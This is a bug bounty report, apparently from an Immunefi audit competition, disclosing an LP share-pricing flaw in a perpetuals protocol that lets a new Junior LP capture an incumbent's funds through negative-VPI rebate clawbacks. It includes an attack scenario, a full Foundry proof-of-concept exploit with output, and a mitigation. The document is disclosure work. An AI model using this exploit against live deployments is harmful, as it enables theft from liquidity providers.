# \#99076 [SC-Critical] LP entry pricing omits the funded negative-VPI clawback reserve, letting a new Junior LP take the incumbent LP's principal

**Submitted on Nov 11th 2026 at 18:47:45 UTC by @Cryptor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99076
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  - Theft of unclaimed yield

## Description

## Brief/Intro

A skew-reducing open earns a negative virtual price impact (VPI) rebate. HousePool pays that rebate in cash, and the same amount is locked in the trader's clearinghouse account as a nonwithdrawable VPI reserve that must return to the pool when the position closes. Junior share pricing has no term for that reserve. An attacker who controls the rebated position deposits into the Junior tranche while the reserve is outstanding, so its shares are priced after the rebate left the pool but before it comes back. It then closes the position, which returns the reserve to HousePool, and redeems. The returned cash is shared with the new shares even though the incumbent Junior LP's capital paid the rebate. With the v2.0.0 release parameters and an unchanged mark, one cycle moves 600.028043 USDG from a 1,000,000 USDG incumbent Junior LP to the attacker, which ends 279.189857 USDG above everything it funded after fees. Four cycles leave the incumbent redeeming 999,202.830159 USDG against its 1,000,000 USDG deposit.

## Vulnerability Details

### The rebate is paid in cash and reserved for a mandatory clawback

The open path pays a skew-reducing rebate out of HousePool and locks the same gross amount as VPI backing:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:442-444
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}

// packages/perps/src/CfdEngineSettlementSidecar.sol:466-477
if (delta.vpiRebateReserveAfterAssets > delta.vpiRebateReserveBeforeAssets) {
    uint256 reserveIncreaseAssets = delta.vpiRebateReserveAfterAssets - delta.vpiRebateReserveBeforeAssets;
    uint256 reserveFromFreeAssets = reserveIncreaseAssets - delta.vpiRebateReserveFromPledgeAssets;
    if (reserveFromFreeAssets > 0) {
        clearinghouse.lockVpiRebateReserve(delta.account, reserveFromFreeAssets);
    }
    ...
}
```

The close clamp forces the clawback of every unit of negative lifetime VPI, whatever the current depth:

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative.
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The settlement sidecar sends the consumed reserve to the pool (`CfdEngineSettlementSidecar.sol:691-693`), where it is recorded as `Revenue` with `CashArrived` (`CfdEngineSettlementSidecar.sol:604-613`). The project states the backing guarantee as an invariant: "Every live negative lifetime-VPI balance has equal dedicated action-reserve backing; only an exact clawback, equivalent withholding, or lower surviving target may consume or release it" (`SECURITY.md:376`). The rebate is therefore a fully funded receivable of the LPs whose capital paid it.

### The LP share price omits that receivable

Entry and exit share prices come from one snapshot:

```solidity
// packages/perps/src/CfdEngineProtocolLens.sol:63-72
uint256 poolAssets = engineContract.pool().totalAssets();
snapshot.physicalAssets = poolAssets;
...
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;

// packages/perps/src/libraries/HousePoolAccountingLib.sol:63-77
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
...
snapshot.distributable = terminalAssets - terminalLiabilities;
```

The reserve is not pool cash, not a trader claim, and not price PnL in the terminal book (`TerminalNavBookV2.sol:433-434` caps the curve at pledge plus claim). A Junior deposit activated while the reserve exists is priced at a NAV that reflects the rebate payout but not its guaranteed return (`HousePool.sol:914-920`, `:1046-1049`, `:1089-1090`). Once the attacker holds the new shares, the clawback arrives as HousePool revenue and is shared pro rata with them.

### Root cause

`HousePoolAccountingLib.buildReconcileSnapshot`, fed by `CfdEngineProtocolLens.getHousePoolInputSnapshot`, prices LP entry from physical cash net of claims plus the price curve. Cash that left the pool as a negative-VPI rebate and is locked as a dedicated, nonwithdrawable clawback reserve is in none of those terms, so a deposit activated while the reserve exists is priced below the value the new shares receive.

### Why the documented NAV exclusion does not cover this transfer

The specification excludes the reserve from marked NAV for a stated reason: "The reserve is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles" (`WHITEPAPER.md:887-888`; also `ACCOUNTING_SPEC.md:1064-1066`, `SECURITY.md:871-872`). That rationale protects the pool against early exits. Because entry uses the same snapshot (`ACCOUNTING_SPEC.md:158-161`: "the sole mark-to-close adjustment used to price both LP deposits and LP redemptions"), the exclusion also sells the receivable to entrants at zero, which the rationale does not address. The specification's symmetry rule says an entrant "receives credit only for collectible marked receivables" (`ACCOUNTING_SPEC.md:172-173`); here the entrant pays nothing for the reserved clawback and still collects its share of it.

The project documents a timing transfer of this kind for exactly one quantity, carry, and only as an explicit policy (`ACCOUNTING_SPEC.md:737-740`: "This intentionally allows a trader and incoming LP to time collection after LP activation"). No equivalent statement exists for the VPI reserve, which, unlike pending carry, is already funded and locked when the entrant buys in.

### Relation to known issues

The published scan's VPI items concern depth-manipulated rebate size and the lifetime clamp (`scan-plether-fi-plether-core-d4541b49.md:1748`, `:1796`, `:1808`); the 2026-10-26 Cecuro audit has no LP-pricing VPI finding. Neither describes LP entry pricing that omits a reserved clawback.

Report #98216 in this competition concerns the mirror-image omission in the same snapshot: collected positive VPI that the trader can still recover is counted as redeemable LP value, and an exiting LP benefits. It is confirmed as a duplicate of a valid report, so the NAV-exclusion wording above did not make that VPI cohort transfer a design choice. This report is a different omission with a different fix. Its remedy prices the funded negative-VPI reserve into `distributable`; the #98216 remedy adds a liability for `max(vpiAccrued, 0)`. In this proof every live position has `vpiAccrued <= 0` at both LP entry and LP exit, so the #98216 remedy leaves this transfer unchanged, and the remedy here has no effect on a position with positive accrued VPI.

### Attack scenario

1. Ordinary activity leaves the book skewed by a live Short with nonpositive accrued VPI (in the proof, an independent Long opens and closes around an independent Short). An incumbent Junior LP has deposited 1,000,000 USDG.
2. The attacker's trader account opens a skew-reducing Long at the unchanged 1.00 mark. HousePool pays a 799.358404 USDG rebate; the same amount is locked as the attacker's VPI reserve.
3. The attacker requests a Junior deposit of 3,000,000 USDG and a keeper settles the LP epoch. The shares are priced with the rebate already deducted and the reserve not counted.
4. After activation the attacker closes the Long at the same mark. The lifetime clamp returns the full 799.358404 USDG to HousePool; the attacker's shares own 74.99% of it.
5. After the one-hour cooldown the attacker redeems. Steps 2 to 5 repeat against the same long-lived rebated position.

Every step uses public Router, HousePool, Clearinghouse and vault entrypoints. No privileged role, oracle movement, trader claim or degraded mode is involved; orders are executed by an unrelated keeper.

## Impact Details

One cycle at release economics and a constant 1.00 mark (six-decimal USDG):

| Quantity | Attack (entry during reserve) | Control (same trades, close before entry) |
| --- | ---: | ---: |
| Attacker funded (LP 3,000,000 + trader 300,000) | 3,300,000.000000 | 3,300,000.000000 |
| Attacker final wallet value | 3,300,279.189857 | 3,299,679.160871 |
| Incumbent Junior LP redemption (deposit 1,000,000) | 1,001,001.377617 | 1,001,601.405660 |

The timing alone moves 600.028043 USDG from the incumbent to the attacker (attacker side 600.028986; the 943-atom difference is carry over the different elapsed time). The attacker ends 279.189857 USDG above everything it funded, net of two execution fees.

Four cycles against the same rebated Short:

| Quantity | Attack | Control (same trades, no entry during reserve) |
| --- | ---: | ---: |
| Attacker gain per cycle | 279.189857, 279.638970, 280.089093, 280.540123 | fees only |
| Incumbent Junior LP redemption (deposit 1,000,000) | 999,202.830159 | 1,001,602.552834 |

The incumbent ends 797.169841 USDG below its deposit and 2,399.722675 USDG below the control. This is a loss of deposited principal held in HousePool, which maps to "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical). Where the transferred value is classed as the incumbent's accrued yield instead (the single-cycle case, where the incumbent still ends above its deposit), the same mechanism maps to "Theft of unclaimed yield" (High).

Scale: the rebate is bounded by `vpiFactor * skew^2 / (2 * depth)`, so at a given skew ratio the per-cycle transfer grows linearly with pool depth (about 8 bps of Junior depth at the 40% skew cap). Each cycle pays two 4 bps execution fees, so the attack is profitable once the attacker's Junior share at the clawback exceeds roughly 40%. The cycle can be repeated against any long-lived rebated position.

### Mitigation

Price the reserved clawback into LP share NAV while its position is open: carry an aggregate of gross negative-VPI backing (equal to the sum of `vpiRebateReserveBalances`) in `HousePoolInputSnapshot` and add it to `distributable` in `buildReconcileSnapshot`, without adding it to `physicalAssets` or to the withdrawal free-cash calculation. The reserve then stays unavailable to fund redemptions, which keeps the documented exit protection, while entrants pay for the share of the clawback they will receive. A release of reserve value to the trader (a lower surviving target or equivalent withholding) removes it from the aggregate in the same transition. With this change applied in a scratch copy, both PoC tests fail: the attacker ends 320.328758 USDG down (its fees) and the incumbent's loss falls from 600.028043 to 0.510028 USDG (carry timing).

## References

- `packages/perps/src/CfdEngineSettlementSidecar.sol:442-444` (rebate paid from HousePool at open), `:466-477` (reserve locked), `:604-613` and `:691-693` (clawback consumed to the pool as revenue)
- `packages/perps/src/libraries/CloseAccountingLib.sol:112-118` (lifetime clamp forces the clawback)
- `packages/perps/src/MarginClearinghouse.sol:842-905` (reserve lock, release and consume)
- `packages/perps/src/CfdEngineProtocolLens.sol:59-72` (snapshot terms)
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78` (`buildReconcileSnapshot`)
- `packages/perps/src/TerminalNavBookV2.sol:433-434` (curve cap is pledge plus claim only)
- `packages/perps/src/HousePool.sol:914-920`, `:1046-1049`, `:1089-1090` (Junior deposit priced and booked from that snapshot)
- `packages/perps/SECURITY.md:376`, `:866-872`; `packages/perps/ACCOUNTING_SPEC.md:158-174`, `:737-740`, `:1064-1066`; `packages/perps/WHITEPAPER.md:887-888`

## Proof of Concept

## Proof of Concept

The test runs on an unmodified checkout of `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It uses the repository's own `BasePerpTest` fixture with the v2.0.0 release risk parameters, and every trader action goes through the production V3 entrypoint `OrderRouter.commitOrder(OrderV3Types.OrderRequest)`, executed by an unrelated keeper through `OrderRouter.executeOrder`. LP flows use `TrancheVault.requestDeposit`, `claimDeposit`, `requestRedeem`, `claimRedeem` and `OrderRouter.settleLpEpoch`. No production source is modified, no fixture file is modified, and no call is mocked; `MockPyth` publishes a constant 1.00 basket to the real `PletherOracle`.

### Step-by-step

1. Setup (`_setupSkewedBook`): an incumbent LP deposits 1,000,000 USDG into Junior. An independent Long opens, an independent Short opens, and the Long closes, leaving the Short skewing the book. The mark stays at 1.00 throughout.
2. The attacker's trader account (`ATTACKER_LONG`) opens a skew-reducing Long. The test asserts that HousePool cash fell and that the clearinghouse VPI reserve equals the rebate exactly (799.358404 USDG).
3. The state is snapshotted.
4. Attack branch: the attacker's LP account deposits 3,000,000 USDG into Junior and a keeper settles the epoch, so the shares are priced while the reserve is outstanding. The attacker closes the Long; the test asserts that the reserve returns to zero and that pool cash rises by the clawback. The attacker redeems and withdraws its trader balance; the independent Short closes and the incumbent redeems.
5. Control branch, restored from the snapshot: the same actions in the same order, except the attacker closes the Long before its LP deposit.
6. Assertions: attacker ends above everything it funded; the same trades without the timing lose money; the incumbent loses more than 500 USDG; attacker gain equals incumbent loss within 1,000 atoms. Every step asserts an unchanged mark, no trader claim, no degraded mode, and no live position with positive accrued VPI.
7. The second test repeats steps 2 to 4 four times against the same Short and shows the incumbent redeeming below its 1,000,000 USDG deposit, while the same trades without LP entry leave it above its deposit.

### Setup

Save the file below as `packages/perps/test/bounty/c7/NegativeVpiReserveEntryTransfer.t.sol` and run from `packages/perps`:

```sh
forge test --match-path 'test/bounty/c7/*' -vv
```

### Test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @notice A Junior LP that enters while a rebated (negative-VPI) position is open buys shares at a NAV that omits the
///         fully reserved VPI clawback, then shares that clawback with the incumbent LP whose capital paid the rebate.
/// @dev Uses the repository's BasePerpTest fixture with the v2.0.0 release risk parameters, the production V3
///      `OrderRouter.commitOrder(OrderRequest)` entrypoint, `OrderRouter.executeOrder`, `OrderRouter.settleLpEpoch`,
///      the Junior `TrancheVault` request/claim flow and `MarginClearinghouse.withdraw`. Orders are executed by an
///      unrelated keeper. The basket mark is constant (1.00) for the whole test, no trader claim arises and the
///      engine never enters degraded mode. No production source is modified and no call is mocked.
contract NegativeVpiReserveEntryTransfer is BasePerpTest {

    address constant INCUMBENT_LP = address(0xBEEF);
    address constant INCUMBENT_LONG = address(0xCAFE);
    address constant INCUMBENT_SHORT = address(0xC0FFEE);
    address constant ATTACKER_LP = address(0xA11CE);
    address constant ATTACKER_LONG = address(0xA003);
    address constant KEEPER = address(0x5EEDED);
    uint256 constant MARK = 100_000_000;
    uint256 constant SIZE = 400_000e18;
    uint256 constant INCUMBENT_PRINCIPAL = 1_000_000e6;
    uint256 constant ATTACKER_LP_PRINCIPAL = 3_000_000e6;
    uint256 constant ATTACKER_TRADER_PRINCIPAL = 300_000e6;
    uint256 constant CYCLES = 4;

    // ---------------------------------------------------------------------------------------------------------------
    // Release configuration (deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0, DEPLOYMENT.md)
    // ---------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maxSkewRatio = 0.4e18;
        p.maintMarginBps = 10;
        p.initMarginBps = 20;
        p.fadMarginBps = 300;
        p.baseCarryBps = 500;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Helpers: every trader action goes through the production V3 commit entrypoint and a third-party keeper.
    // ---------------------------------------------------------------------------------------------------------------

    function _request(
        CfdTypes.Side side,
        bool close
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: SIZE,
            marginDelta: close ? 0 : 100_000e6,
            // Market order: no price limit in either direction.
            targetPrice: (side == CfdTypes.Side.LONG) == close ? type(uint256).max : 1,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _order(
        address account,
        CfdTypes.Side side,
        bool close
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, close);
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(MARK);
        uint256 fee = pletherOracle.getOrderExecutionFee(data);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee}(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
        _assertNeutralState();
    }

    function _settleEpoch() internal {
        bytes[] memory data = _mockPythUpdateData(MARK);
        uint256 fee = pletherOracle.getUpdateFee(data);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        router.settleLpEpoch{value: fee}(data);
        _assertNeutralState();
    }

    /// @dev Unchanged mark, no trader claim, never degraded: the transfer is neither price PnL nor insolvency.
    function _assertNeutralState() internal view {
        assertEq(engine.lastMarkPrice(), MARK, "mark never moves");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim");
        assertFalse(engine.degradedMode(), "never degraded");
    }

    /// @dev Every live position has zero or negative lifetime VPI, so no refundable positive VPI is involved.
    function _assertNoPositiveVpiAlive() internal view {
        address[3] memory accounts = [INCUMBENT_LONG, INCUMBENT_SHORT, ATTACKER_LONG];
        for (uint256 i; i < accounts.length; ++i) {
            (uint256 size,,,,,, int256 vpiAccrued) = engine.positions(accounts[i]);
            if (size != 0) {
                assertLe(vpiAccrued, 0, "no positive VPI alive");
            }
        }
    }

    function _deposit(
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 id = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(id));
        _settleEpoch();
        vm.prank(lp);
        juniorVault.claimDeposit(id, amount, lp, lp);
    }

    function _redeem(
        address lp
    ) internal returns (uint256 assets) {
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 shares = juniorVault.maxRequestRedeem(lp);
        vm.prank(lp);
        uint256 id = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(pool.lpEpochStart(id));
        _settleEpoch();
        assertEq(juniorVault.claimableRedeemRequest(id, lp), shares, "fully funded");
        vm.prank(lp);
        assets = juniorVault.claimRedeem(id, shares, lp, lp);
    }

    function _withdrawFlatTrader(
        address trader
    ) internal returns (uint256 assets) {
        uint256 balance = clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        clearinghouse.withdraw(trader, balance);
        assets = settlementToken.balanceOf(trader);
    }

    /// @dev Ordinary activity by independent accounts: an incumbent Junior LP, and a Long/Short pair that leaves one
    ///      live Short skewing the book (the Long has closed).
    function _setupSkewedBook() internal {
        _deposit(INCUMBENT_LP, INCUMBENT_PRINCIPAL);
        _fundTrader(INCUMBENT_LONG, 300_000e6);
        _fundTrader(INCUMBENT_SHORT, 300_000e6);
        _fundTrader(ATTACKER_LONG, ATTACKER_TRADER_PRINCIPAL);
        _order(INCUMBENT_LONG, CfdTypes.Side.LONG, false);
        _order(INCUMBENT_SHORT, CfdTypes.Side.SHORT, false);
        _order(INCUMBENT_LONG, CfdTypes.Side.LONG, true);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Test 1: one cycle, attack versus same-state control
    // ---------------------------------------------------------------------------------------------------------------

    function test_entryBeforeVpiClawbackTransfersIncumbentValue() public {
        _setupSkewedBook();

        // The attacker's trader account reduces the skew. HousePool pays the rebate in cash and the same amount is
        // locked in the attacker's clearinghouse account as a nonwithdrawable VPI reserve.
        uint256 poolBeforeRebate = pool.totalAssets();
        _order(ATTACKER_LONG, CfdTypes.Side.LONG, false);
        (,,,,,, int256 attackerLongVpi) = engine.positions(ATTACKER_LONG);
        uint256 rebate = uint256(-attackerLongVpi);
        assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER_LONG), rebate, "rebate fully reserved for clawback");
        assertGt(poolBeforeRebate, pool.totalAssets(), "pool cash paid the rebate");
        _assertNoPositiveVpiAlive();

        uint256 beforeEntry = vm.snapshotState();

        // Attack: Junior entry is activated while the reserved clawback is outside LP NAV, then the clawback returns.
        _deposit(ATTACKER_LP, ATTACKER_LP_PRINCIPAL);
        _assertNoPositiveVpiAlive();
        uint256 attackerShareBps = juniorVault.balanceOf(ATTACKER_LP) * 10_000 / juniorVault.totalSupply();
        uint256 poolBeforeClawback = pool.totalAssets();
        _order(ATTACKER_LONG, CfdTypes.Side.LONG, true);
        assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER_LONG), 0, "reserve returned to pool");
        assertGt(pool.totalAssets(), poolBeforeClawback, "clawback arrives in pool cash");
        uint256 attackAttacker = _redeem(ATTACKER_LP) + _withdrawFlatTrader(ATTACKER_LONG);
        _order(INCUMBENT_SHORT, CfdTypes.Side.SHORT, true);
        uint256 attackIncumbent = _redeem(INCUMBENT_LP);

        assertTrue(vm.revertToState(beforeEntry));

        // Control: identical state and actions, except the clawback lands before the attacker's LP entry.
        _order(ATTACKER_LONG, CfdTypes.Side.LONG, true);
        _deposit(ATTACKER_LP, ATTACKER_LP_PRINCIPAL);
        uint256 controlAttacker = _redeem(ATTACKER_LP) + _withdrawFlatTrader(ATTACKER_LONG);
        _order(INCUMBENT_SHORT, CfdTypes.Side.SHORT, true);
        uint256 controlIncumbent = _redeem(INCUMBENT_LP);

        uint256 funded = ATTACKER_LP_PRINCIPAL + ATTACKER_TRADER_PRINCIPAL;
        int256 attackerNet = int256(attackAttacker) - int256(funded);
        int256 incumbentLoss = int256(controlIncumbent) - int256(attackIncumbent);
        int256 timingGain = int256(attackAttacker) - int256(controlAttacker);
        console2.log("rebate paid and reserved (USDG atoms)  ", rebate);
        console2.log("attacker Junior share at clawback (bps)", attackerShareBps);
        console2.log("attacker funded                        ", funded);
        console2.log("attacker final (attack)                ", attackAttacker);
        console2.log("attacker final (control)               ", controlAttacker);
        console2.log("attacker net profit (attack)           ", attackerNet);
        console2.log("incumbent redeemed (attack)            ", attackIncumbent);
        console2.log("incumbent redeemed (control)           ", controlIncumbent);
        console2.log("incumbent value lost                   ", incumbentLoss);

        assertGt(attackerNet, 0, "attacker ends above everything it funded");
        assertLt(controlAttacker, funded, "same trades without the entry timing lose money");
        assertGt(incumbentLoss, 500e6, "incumbent LP loses part of the clawback it funded");
        assertApproxEqAbs(timingGain, incumbentLoss, 1000, "attacker gain equals incumbent loss up to carry dust");
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Test 2: repeated cycles push the incumbent below its deposited principal
    // ---------------------------------------------------------------------------------------------------------------

    function _attackerWealth(
        uint256 attackerLpWallet
    ) internal view returns (uint256) {
        return attackerLpWallet + clearinghouse.balanceAssets(ATTACKER_LONG);
    }

    function test_repeatedEntryCyclesDrainIncumbentPrincipal() public {
        _setupSkewedBook();
        uint256 beforeCycles = vm.snapshotState();

        // Attack: CYCLES x (rebated open, Junior entry, close with clawback, redeem). The same 3,000,000 USDG LP stake
        // is reused each cycle; the fixture mints it per cycle, so the gain is measured per cycle.
        uint256 lpWallet;
        int256 totalGain;
        for (uint256 i; i < CYCLES; ++i) {
            uint256 wealthBefore = _attackerWealth(lpWallet) + ATTACKER_LP_PRINCIPAL;
            _order(ATTACKER_LONG, CfdTypes.Side.LONG, false);
            _assertNoPositiveVpiAlive();
            _deposit(ATTACKER_LP, ATTACKER_LP_PRINCIPAL);
            _order(ATTACKER_LONG, CfdTypes.Side.LONG, true);
            _assertNoPositiveVpiAlive();
            lpWallet += _redeem(ATTACKER_LP);
            int256 cycleGain = int256(_attackerWealth(lpWallet)) - int256(wealthBefore);
            totalGain += cycleGain;
            console2.log("cycle", i + 1);
            console2.log("  attacker gain", cycleGain);
            assertGt(cycleGain, 0, "each cycle is profitable for the attacker");
        }
        _order(INCUMBENT_SHORT, CfdTypes.Side.SHORT, true);
        uint256 incumbentAttack = _redeem(INCUMBENT_LP);

        assertTrue(vm.revertToState(beforeCycles));

        // Control: the same trades with no LP entry between rebate and clawback.
        for (uint256 i; i < CYCLES; ++i) {
            _order(ATTACKER_LONG, CfdTypes.Side.LONG, false);
            _order(ATTACKER_LONG, CfdTypes.Side.LONG, true);
        }
        _order(INCUMBENT_SHORT, CfdTypes.Side.SHORT, true);
        uint256 incumbentControl = _redeem(INCUMBENT_LP);

        console2.log("attacker total gain over cycles        ", totalGain);
        console2.log("incumbent deposit                      ", INCUMBENT_PRINCIPAL);
        console2.log("incumbent redeemed (attack)            ", incumbentAttack);
        console2.log("incumbent redeemed (control)           ", incumbentControl);
        assertGe(incumbentControl, INCUMBENT_PRINCIPAL, "control incumbent keeps its deposit");
        assertLt(incumbentAttack, INCUMBENT_PRINCIPAL, "incumbent LP redeems below its deposit");
    }

}
```

### Output

```text
Ran 2 tests for test/bounty/c7/NegativeVpiReserveEntryTransfer.t.sol:NegativeVpiReserveEntryTransfer
[PASS] test_entryBeforeVpiClawbackTransfersIncumbentValue() (gas: 20223948)
Logs:
  rebate paid and reserved (USDG atoms)   799358404
  attacker Junior share at clawback (bps) 7499
  attacker funded                         3300000000000
  attacker final (attack)                 3300279189857
  attacker final (control)                3299679160871
  attacker net profit (attack)            279189857
  incumbent redeemed (attack)             1001001377617
  incumbent redeemed (control)            1001601405660
  incumbent value lost                    600028043

[PASS] test_repeatedEntryCyclesDrainIncumbentPrincipal() (gas: 46072656)
Logs:
  cycle 1
    attacker gain 279189857
  cycle 2
    attacker gain 279638970
  cycle 3
    attacker gain 280089093
  cycle 4
    attacker gain 280540123
  attacker total gain over cycles         1119458043
  incumbent deposit                       1000000000000
  incumbent redeemed (attack)             999202830159
  incumbent redeemed (control)            1001602552834

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

Amounts are six-decimal USDG atoms. Foundry gas covers the whole test, including setup and both branches; it is not an attack-transaction estimate. The fixture's default two-feed basket is used so the file runs without fixture changes; the transfer occurs at a constant mark and does not depend on basket composition. A variant with the release six-feed basket (feed ids, weights, base prices and inversions from the deploy script) produces identical numbers.

### Fix check

Applying the mitigation in a scratch copy (an aggregate of `vpiRebateReserveBalances` maintained in the four reserve writers of `MarginClearinghouse` and added to `terminalLpPriceDeltaAssets` in `CfdEngineProtocolLens.getHousePoolInputSnapshot`) makes both tests fail:

```text
[FAIL: attacker ends above everything it funded: -320328758 <= 0] test_entryBeforeVpiClawbackTransfersIncumbentValue()
  incumbent value lost                    510028
[FAIL: each cycle is profitable for the attacker: -320328758 <= 0] test_repeatedEntryCyclesDrainIncumbentPrincipal()
```

With the patch reverted, both tests pass again.
